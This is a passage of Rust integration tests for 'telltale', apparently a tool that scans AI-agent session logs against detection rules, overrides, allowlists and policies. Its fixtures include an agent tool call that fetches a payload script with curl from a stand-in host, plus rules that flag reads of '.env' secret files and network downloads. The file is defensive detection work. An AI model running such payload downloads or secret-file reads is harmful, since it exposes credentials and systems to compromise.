        baseline.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&baseline.stderr)
    );
    let baseline_summary: Value = serde_json::from_slice(&baseline.stdout).expect("summary json");

    let tuned = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "test"])
        .arg(&fixture)
        .args(["--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run tuned rules test");
    assert!(
        tuned.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&tuned.stderr)
    );
    let tuned_summary: Value = serde_json::from_slice(&tuned.stdout).expect("summary json");
    assert_eq!(baseline_summary["match_count"], 1);
    assert_eq!(tuned_summary["match_count"], 1);
    assert!(
        tuned_summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    let baseline_risk = baseline_summary["matches"][0]["risk_score"]
        .as_u64()
        .expect("baseline risk");
    let tuned_risk = tuned_summary["matches"][0]["risk_score"]
        .as_u64()
        .expect("tuned risk");
    assert_eq!(tuned_risk, baseline_risk - 15);
}

#[test]
fn rules_test_uses_ordered_managed_replacement_rule() {
    let temp = tempdir().expect("tempdir");
    let fixture = temp.path().join("codex-fixture.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","session_id":"managed-replacement-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"bash","command":"printf fixture-secret-marker","message":"Synthetic managed replacement fixture."}}
"#,
    )
    .expect("write Codex fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "test",
            "--no-default-rules",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
        ])
        .arg(&fixture)
        .output()
        .expect("run ordered rules test");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("rules test json");
    assert_eq!(summary["match_count"], 1);
    assert_eq!(summary["matches"][0]["risk_score"], 77);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
}

#[test]
fn rules_export_default_writes_bundled_rules_to_stdout() {
    let temp = tempdir().expect("tempdir");
    let exported_path = temp.path().join("exported-default-rules.yaml");

    let export = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "export-default"])
        .output()
        .expect("run telltale rules export-default");
    assert!(
        export.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&export.stderr)
    );
    let exported_yaml = String::from_utf8(export.stdout).expect("exported yaml utf8");
    assert!(exported_yaml.contains("taxonomy: telltale"));
    assert!(!exported_yaml.contains("version:"));
    assert!(exported_yaml.contains("secret.env.read"));
    fs::write(&exported_path, exported_yaml).expect("write exported yaml");

    let validate = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--no-default-rules",
            "--no-local-config",
            "--rules",
        ])
        .arg(&exported_path)
        .output()
        .expect("validate exported default rules");
    assert!(
        validate.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validate.stderr)
    );
    let summary: Value = serde_json::from_slice(&validate.stdout).expect("summary json");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
}

#[test]
fn rules_export_default_writes_file_and_requires_force_to_overwrite() {
    let temp = tempdir().expect("tempdir");
    let output_path = temp.path().join("default-rules.yaml");

    let first_export = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .output()
        .expect("run telltale rules export-default --output");
    assert!(
        first_export.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first_export.stderr)
    );
    let first_contents = fs::read_to_string(&output_path).expect("exported default rules");
    assert!(first_contents.contains("network.download"));

    let overwrite_without_force = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .output()
        .expect("run telltale rules export-default overwrite");
    assert!(!overwrite_without_force.status.success());
    let stderr = String::from_utf8_lossy(&overwrite_without_force.stderr);
    assert!(stderr.contains("already exists"));
    assert!(stderr.contains("--force"));

    fs::write(&output_path, "placeholder\n").expect("replace output with placeholder");
    let overwrite_with_force = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "export-default", "--output"])
        .arg(&output_path)
        .arg("--force")
        .output()
        .expect("run telltale rules export-default --force");
    assert!(
        overwrite_with_force.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&overwrite_with_force.stderr)
    );
    let forced_contents = fs::read_to_string(&output_path).expect("forced exported default rules");
    assert_eq!(forced_contents, first_contents);
}

#[test]
fn config_validate_default_rules_without_local_config() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
    assert_eq!(summary["default_rules"], true);
    assert_eq!(summary["local_config"]["enabled"], false);
    assert_eq!(
        summary["local_config"]["explicit_config_dirs"],
        Value::Array(vec![])
    );
    assert_eq!(summary["local_config"]["discovered_rule_count"], 0);
    assert_eq!(
        summary["outputs"]["delivery"]["posture"],
        "durable_first_write"
    );
    assert_eq!(summary["outputs"]["delivery"]["source"], "legacy_default");
    assert_eq!(summary["outputs"]["delivery"]["enabled_sink_count"], 1);
}

#[test]
fn config_validate_custom_only_rules_succeeds_with_one_rule() {
    let temp = tempdir().expect("tempdir");
    let rule_path = temp.path().join("custom-only.yaml");
    fs::write(
        &rule_path,
        custom_rule_yaml("custom.config_validate.only", "custom-only"),
    )
    .expect("write custom rule");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "config",
            "validate",
            "--no-default-rules",
            "--no-local-config",
            "--rules",
        ])
        .arg(&rule_path)
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["default_rules"], false);
    assert_eq!(summary["rule_count"], 1);
    assert_eq!(summary["rules"]["explicit_count"], 1);
    assert_eq!(
        summary["rules"]["paths"],
        Value::Array(vec![Value::String("[sensitive-path]".to_string())])
    );
}

#[test]
fn config_validate_repeated_rules_are_additive_and_reported() {
    let temp = tempdir().expect("tempdir");
    let first_rule = temp.path().join("first.yaml");
    let second_rule = temp.path().join("second.yaml");
    fs::write(
        &first_rule,
        custom_rule_yaml("custom.config_validate.first", "custom-first"),
    )
    .expect("write first custom rule");
    fs::write(
        &second_rule,
        custom_rule_yaml("custom.config_validate.second", "custom-second"),
    )
    .expect("write second custom rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run telltale config validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");
    let default_rule_count = defaults_summary["rule_count"]
        .as_u64()
        .expect("default rule count");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config", "--rules"])
        .arg(&first_rule)
        .args(["--rules"])
        .arg(&second_rule)
        .output()
        .expect("run telltale config validate with repeated rules");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["rule_count"].as_u64(), Some(default_rule_count + 2));
    assert_eq!(summary["rules"]["explicit_count"], 2);
    let paths = summary["rules"]["paths"].as_array().expect("rule paths");
    assert!(paths.iter().all(|path| path == "[sensitive-path]"));
}

#[test]
fn config_validate_discovers_local_rules_d_additively() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rules_dir = config_root.join("rules.d");
    fs::create_dir_all(&rules_dir).expect("rules dir");
    fs::write(
        rules_dir.join("custom-agent-behavior.yml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config"])
        .output()
        .expect("run telltale config validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let discovered = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate with local config");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );
    assert_eq!(
        discovered_summary["local_config"]["discovered_rule_count"],
        1
    );
    assert_eq!(discovered_summary["rules"]["discovered_count"], 1);
}

#[test]
fn config_validate_reports_discovered_override_paths() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root
        .join("overrides.d")
        .join("lower-secret-score.yml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
description: Local config validate override test.
overrides:
  - rule_id: secret.env.read
    score: 20
    reason: Lab environment tuning.
"#,
    )
    .expect("write override");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["local_config"]["discovered_override_count"], 1);
    assert_eq!(summary["overrides"]["discovered_count"], 1);
    assert_eq!(
        summary["overrides"]["paths"],
        Value::Array(vec![Value::String("[sensitive-path]".to_string())])
    );
}

#[test]
fn config_validate_rejects_invalid_local_overrides() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/invalid.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: missing.rule
    enabled: false
    reason: Unknown rule is left out.
"#,
    )
    .expect("write unknown override");
    // An entry that names no loaded rule is left out, not invalid.
    let unknown = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");
    assert!(
        unknown.status.success(),
        "{}",
        String::from_utf8_lossy(&unknown.stderr)
    );

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    enabled: false
    reason: "   "
"#,
    )
    .expect("write empty reason override");
    let empty_reason = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");
    assert!(
        !empty_reason.status.success(),
        "empty reason override should fail"
    );
    let stderr = String::from_utf8_lossy(&empty_reason.stderr);
    assert!(stderr.contains("requires a non-empty reason"));

    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    reason: Missing effect should fail.
"#,
    )
    .expect("write no effect override");
    let no_effect = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");
    assert!(
        !no_effect.status.success(),
        "no effect override should fail"
    );
    let stderr = String::from_utf8_lossy(&no_effect.stderr);
    assert!(stderr.contains("must set enabled or score"));
}

#[test]
fn config_validate_reports_managed_rule_replacement() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rule_path = config_root.join("rules.d/duplicate-bundled.yaml");
    fs::create_dir_all(rule_path.parent().expect("rules dir")).expect("rules dir");
    fs::write(
        &rule_path,
        r#"title: Duplicate bundled rule id
id: 416a6e7f-29bd-470c-bf0e-a1a24646a288
name: secret.env.read
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re|i: '\.env'
    condition: selection
level: medium
telltale:
    category: secret_access
    score: 35
    explanation: 'Duplicate bundled rule id.'
    tags: [test]
"#,
    )
    .expect("write duplicate rule");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "config validate should accept managed replacement: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("config validation json");
    let replacement = summary["rules"]["provenance"]
        .as_array()
        .expect("rule provenance")
        .iter()
        .find(|entry| entry["id"] == "secret.env.read")
        .expect("replaced bundled rule provenance");
    assert!(telltale_schema::event::is_canonical_sha256_hex(
        replacement["winner"]
            .as_str()
            .expect("terminal winner hash")
    ));
    assert_eq!(
        replacement["replaced_sources"],
        serde_json::json!([evidence_hash("builtin:telltale.default")])
    );
}

#[test]
fn config_validate_reports_ambiguous_policy_unless_explicit_policy_is_supplied() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::write(
        config_root.join("policies.d/one.yaml"),
        "name: local-one\ndisabled_categories: [network]\n",
    )
    .expect("write first local policy");
    fs::write(
        config_root.join("policies.d/two.yml"),
        "name: local-two\ndisabled_categories: [secret_access]\n",
    )
    .expect("write second local policy");
    let explicit_policy = temp.path().join("explicit-policy.yaml");
    fs::write(
        &explicit_policy,
        "name: explicit-policy\ndisabled_categories: [network]\n",
    )
    .expect("write explicit policy");

    let ambiguous = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");
    assert!(!ambiguous.status.success(), "policy ambiguity should fail");
    let stderr = String::from_utf8_lossy(&ambiguous.stderr);
    assert!(
        stderr.contains("multiple local policy files discovered"),
        "unexpected stderr: {stderr}"
    );

    let explicit = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--policy"])
        .arg(&explicit_policy)
        .output()
        .expect("run telltale config validate with explicit policy");
    assert!(
        explicit.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&explicit.stderr)
    );
    let summary: Value = serde_json::from_slice(&explicit.stdout).expect("summary json");
    assert_eq!(
        summary["policy_name"],
        format!("[policy:{}]", evidence_hash("explicit-policy"))
    );
    assert_eq!(summary["local_config"]["discovered_policy_count"], 2);
}

#[test]
fn config_validate_reports_ambiguous_allowlist_unless_explicit_allowlist_is_supplied() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("allowlists.d/one.yaml"),
        "suppressions: []\n",
    )
    .expect("write first local allowlist");
    fs::write(
        config_root.join("allowlists.d/two.yml"),
        "suppressions: []\n",
    )
    .expect("write second local allowlist");
    let explicit_allowlist = temp.path().join("explicit-allowlist.yaml");
    fs::write(&explicit_allowlist, "suppressions: []\n").expect("write explicit allowlist");

    let ambiguous = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");
    assert!(
        !ambiguous.status.success(),
        "allowlist ambiguity should fail"
    );
    let stderr = String::from_utf8_lossy(&ambiguous.stderr);
    assert!(
        stderr.contains("multiple local allowlist files discovered"),
        "unexpected stderr: {stderr}"
    );

    let explicit = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--allowlist"])
        .arg(&explicit_allowlist)
        .output()
        .expect("run telltale config validate with explicit allowlist");
    assert!(
        explicit.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&explicit.stderr)
    );
    let summary: Value = serde_json::from_slice(&explicit.stdout).expect("summary json");
    assert_eq!(summary["local_config"]["discovered_allowlist_count"], 2);
    assert_eq!(summary["allowlist_path"], "[sensitive-path]");
}

#[test]
fn config_validate_reports_single_discovered_allowlist_path() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let allowlist_path = config_root.join("allowlists.d").join("known-benign.yaml");
    fs::create_dir_all(allowlist_path.parent().expect("allowlists dir")).expect("allowlists dir");
    fs::write(
        &allowlist_path,
        "version: 1\ndescription: Test allowlist.\nsuppressions: []\n",
    )
    .expect("write allowlist");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["local_config"]["discovered_allowlist_count"], 1);
    assert_eq!(summary["allowlist_path"], "[sensitive-path]");
}

#[test]
fn config_validate_rejects_unknown_allowlist_suppression_key() {
    let temp = tempdir().expect("tempdir");
    let allowlist_path = temp.path().join("allowlist.yaml");
    fs::write(
        &allowlist_path,
        r#"suppressions:
  - name: misspelled-rule-id
    rule_id: [secret.env.read]
"#,
    )
    .expect("write invalid allowlist");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config", "--allowlist"])
        .arg(&allowlist_path)
        .output()
        .expect("run telltale config validate");

    assert!(!output.status.success(), "config validate should fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("unknown field"),
        "unexpected stderr: {stderr}"
    );
    assert!(stderr.contains("rule_id"), "unexpected stderr: {stderr}");
}

#[test]
fn config_validate_rejects_unknown_policy_key() {
    let temp = tempdir().expect("tempdir");
    let policy_path = temp.path().join("policy.yaml");
    fs::write(
        &policy_path,
        "name: typo-policy\ndisabled_rule: [secret.env.read]\n",
    )
    .expect("write invalid policy");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--no-local-config", "--policy"])
        .arg(&policy_path)
        .output()
        .expect("run telltale config validate");

    assert!(!output.status.success(), "config validate should fail");
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("unknown field"),
        "unexpected stderr: {stderr}"
    );
    assert!(
        stderr.contains("disabled_rule"),
        "unexpected stderr: {stderr}"
    );
}

#[test]
fn config_validate_no_local_config_ignores_config_dirs_and_local_files() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rule_path = config_root.join("rules.d/duplicate-bundled.yaml");
    fs::create_dir_all(rule_path.parent().expect("rules dir")).expect("rules dir");
    fs::write(
        &rule_path,
        custom_rule_yaml("secret.env.read", "duplicate-local"),
    )
    .expect("write invalid local rule");
    let override_path = config_root.join("overrides.d/invalid.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: missing.rule
    enabled: false
    reason: Invalid local override ignored by --no-local-config.
"#,
    )
    .expect("write invalid local override");
    let missing_root = temp.path().join("missing-config");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["config", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--config-dir"])
        .arg(&missing_root)
        .arg("--no-local-config")
        .output()
        .expect("run telltale config validate");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert!(summary["rule_count"].as_u64().expect("rule count") > 0);
    assert_eq!(summary["local_config"]["enabled"], false);
    assert_eq!(
        summary["local_config"]["explicit_config_dirs"],
        Value::Array(vec![])
    );
    assert_eq!(summary["local_config"]["discovered_rule_count"], 0);
    assert_eq!(summary["local_config"]["discovered_override_count"], 0);
}

#[test]
fn additive_custom_defaults_enabled_false_do_not_disable_bundled_rules() {
    let temp = tempdir().expect("tempdir");
    let custom_rules = temp.path().join("disabled-custom-rules.yaml");
    fs::write(
        &custom_rules,
        r#"title: Disabled custom rule used for regression coverage
id: 6061ea1b-b75a-4059-8b15-885b860bd8e5
name: custom.disabled.default
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re|i: 'custom-disabled-default'
    condition: selection
level: low
telltale:
    category: custom_agent_behavior
    score: 10
    explanation: 'Disabled custom rule used for regression coverage.'
    tags: [test]
    enabled: false
"#,
    )
    .expect("write custom rules");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "test",
            "tests/fixtures/session_stores/codex/sessions/2026/04/download-execute-chain.jsonl",
            "--no-local-config",
            "--rules",
        ])
        .arg(&custom_rules)
        .output()
        .expect("run telltale rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "network.download")
    );
}

#[test]
fn additive_custom_defaults_case_sensitive_do_not_change_bundled_case_insensitivity() {
    let temp = tempdir().expect("tempdir");
    let custom_rules = temp.path().join("case-sensitive-custom-rules.yaml");
    fs::write(
        &custom_rules,
        r#"title: Case-sensitive custom rule used for regression coverage
id: a18e69da-ecee-41b4-809d-240c3e1d46d1
name: custom.case_sensitive.default
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re: 'custom-case-sensitive-default'
    condition: selection
level: low
telltale:
    category: custom_agent_behavior
    score: 10
    explanation: 'Case-sensitive custom rule used for regression coverage.'
    tags: [test]
"#,
    )
    .expect("write custom rules");
    let fixture = temp.path().join("uppercase-download.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","session_id":"uppercase-download-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"CURL -fsSL https://example.invalid/payload.sh","message":"Uppercase curl fixture."}}
"#,
    )
    .expect("write uppercase fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .args(["--rules"])
        .arg(&custom_rules)
        .output()
        .expect("run telltale rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "network.download")
    );
}

#[test]
fn scan_target_exclusion_emits_valid_retained_event3() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).expect("sessions");
    fs::write(sessions.join("skip.jsonl"), concat!(
        "{\"type\":\"session_meta\",\"session_id\":\"skip\",\"timestamp\":\"2026-05-08T10:00:00Z\",\"payload\":{\"source\":\"cli\"}}\n",
        "{\"type\":\"event_msg\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"policy says do not read .env; synthetic marker\"}}\n"
    )).expect("synthetic session");
    let rules = temp.path().join("rules.yaml");
    fs::write(
        &rules,
        r#"
title: Synthetic retained match
id: 1d5c8557-6d4b-4f45-87ba-5fd1bad84774
name: test.retained
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re|i: 'synthetic marker'
    condition: selection
level: high
telltale:
    category: execution
    score: 60
    explanation: 'Synthetic retained match'
    tags: [synthetic]
---
title: Synthetic skipped match
id: d908b88e-83b7-4010-8a83-583dd847e09c
name: test.excluded
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection_assistant_context:
        message.assistant_text|re|i: '\.env'
    filter_assistant_context:
        message.assistant_text|re|i: 'policy'
    condition: selection_assistant_context and not filter_assistant_context
level: high
telltale:
    category: execution
    score: 80
    explanation: 'Synthetic skipped match'
    tags: [synthetic, skipped-only]
"#,
    )
    .expect("rules");
    let log = temp.path().join("events.jsonl");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--backfill",
            "--allow-fixtures",
            "--no-local-config",
            "--no-default-rules",
            "--root",
        ])
        .arg(&root)
        .arg("--rules")
        .arg(&rules)
        .arg("--state-path")
        .arg(temp.path().join("state.json"))
        .arg("--log-path")
        .arg(&log)
        .output()
        .expect("scan");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema");
    let validator = validator_for(&schema).expect("validator");
    let events = fs::read_to_string(log)
        .expect("terminal JSONL")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event"))
        .collect::<Vec<_>>();
    for event in &events {
        assert!(validator.is_valid(event), "invalid Event3: {event}");
        assert_ne!(event["event_type"], "scanner_error", "{event}");
    }
    let detections = events
        .iter()
        .filter(|event| event["event_type"] == "detection")
        .collect::<Vec<_>>();
    assert_eq!(detections.len(), 1, "{events:?}");
    let event = detections[0];
    assert_eq!(event["rule_ids"], serde_json::json!(["test.retained"]));
    assert_eq!(event["categories"], serde_json::json!(["execution"]));
    assert_eq!(
        event["detection_classes"],
        serde_json::json!(["security_detection"])
    );
    assert_eq!(event["signal_types"], serde_json::json!(["atomic"]));
    assert_eq!(event["analytic_intents"], serde_json::json!(["alert"]));
    assert_eq!(event["risk_score"], 60);
    assert_eq!(
        event["risk_contributions"]
            .as_array()
            .expect("contributions")
            .len(),
        1
    );
    assert_eq!(event["risk_contributions"][0]["id"], "test.retained");
    assert_eq!(event["risk_contributions"][0]["points"], 60);
    assert_eq!(event["evidence"].as_array().expect("evidence").len(), 2);
    assert_eq!(event["evidence"][0]["rule_id"], "test.retained");
    assert_eq!(event["evidence"][1]["field"], "canonical_observation_id");
    assert_eq!(event["evidence"][1]["rule_id"], "test.retained");
}

#[test]
fn scan_uses_custom_rules_and_policy_category_filters() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let enabled = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        enabled.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&enabled.stderr)
    );
    let enabled_summary: Value = serde_json::from_slice(&enabled.stdout).expect("summary json");
    assert_eq!(enabled_summary["detection_count"], 1);
    assert_eq!(enabled_summary["rule_count"], 1);
    assert_eq!(
        enabled_summary["detection_flow"]["policy_match_accounting"]["status"],
        "not_applicable"
    );

    let disabled = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--policy",
            "tests/fixtures/custom_rules/disable-custom-category.yaml",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        disabled.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&disabled.stderr)
    );
    let disabled_summary: Value = serde_json::from_slice(&disabled.stdout).expect("summary json");
    assert_eq!(disabled_summary["detection_count"], 0);
    assert_eq!(disabled_summary["rule_count"], 0);
    assert_eq!(
        disabled_summary["policy"],
        format!("[policy:{}]", evidence_hash("no-custom-agent-behavior"))
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["status"],
        "available"
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
        1
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
        1
    );
    assert_eq!(
        disabled_summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
        1
    );

    let unnamed_policy = temp.path().join("unnamed-policy.yaml");
    fs::write(
        &unnamed_policy,
        "disabled_categories:\n  - custom_agent_behavior\n",
    )
    .expect("write unnamed policy");
    let unnamed = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--no-local-config", "--root"])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--policy",
        ])
        .arg(&unnamed_policy)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run unnamed-policy scan");
    assert!(
        unnamed.status.success(),
